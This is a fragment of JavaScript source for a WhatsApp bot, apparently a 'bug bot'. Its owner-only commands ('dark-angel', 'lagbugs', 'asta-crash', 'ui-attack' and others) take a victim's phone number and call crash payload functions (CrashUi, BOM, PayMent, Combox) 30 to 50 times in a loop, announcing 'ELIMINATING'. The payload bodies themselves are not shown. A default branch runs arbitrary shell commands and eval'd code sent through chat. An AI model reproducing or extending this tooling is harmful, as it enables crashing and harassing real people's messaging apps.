for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await f7(target)
await f8(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await f7(target)
await f8(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'dark-angel': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await OLDLOC(target, Null) 
await newgalaxy(target)
await BOM(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await OLDLOC(target, Null) 
await newgalaxy(target)
await BOM(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'darknes': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'lagbugs': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 30; i++) {
await Combox(target)
await OLDLOC(target, Null)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'asta-crash': case "ui-attack": case "netcrash": case "bug-docu": case "bug-system": {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
jumlah = qtext.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < jumlah; i++) {
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("ASTA HAS ELIMINATED ")
}
break

case 'offline-magic': {
if (!isOwner) return reply(`CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave`)
reply("ELIMINATING ")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await Combox3(from, jumlah)
await f19(target)
await PayMent(target)
}
reply("ASTA HAS ELIMINATED ")
break

case 'ASTABUG': {
if (!isOwner) return reply(`CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave`)
reply("ELIMINATING ")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await f19(target)
await PayMent(target)
await combox2(target)
}
reply("ASTA HAS ELIMINATED ")
break

default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return ZoO.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return ZoO.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ZoO.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ZoO.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
ZoO.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})